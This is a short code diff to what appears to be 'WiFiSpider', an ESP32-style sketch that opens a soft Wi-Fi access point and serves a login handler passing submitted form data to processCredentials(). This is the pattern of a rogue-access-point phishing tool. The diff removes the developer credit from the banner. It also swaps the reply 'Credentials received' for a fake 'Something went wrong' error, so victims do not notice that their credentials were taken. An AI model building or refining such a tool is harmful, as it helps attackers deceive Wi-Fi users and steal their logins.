@@ -89,7 +89,7 @@ void setup() {
   bool apStarted = WiFi.softAP(SSID.c_str());
 
   if (apStarted) {
-    lcd.println("[WiFiSpider]: Developed By Axion-Security");
+    lcd.println("[WiFiSpider]: Axion-Security");
     lcd.println("AP Started!");
   } else {
     lcd.println("Failed to start AP!");
@@ -107,7 +107,7 @@ void handleLogin() {
   if (webServer.args() > 0) {
     processCredentials();
   }
-  webServer.send(200, "text/html", "<h1>Credentials received</h1>");
+  webServer.send(200, "text/html", "<h1>Something went wrong... Please try later!</h1>");
 }
 
 void processCredentials() {
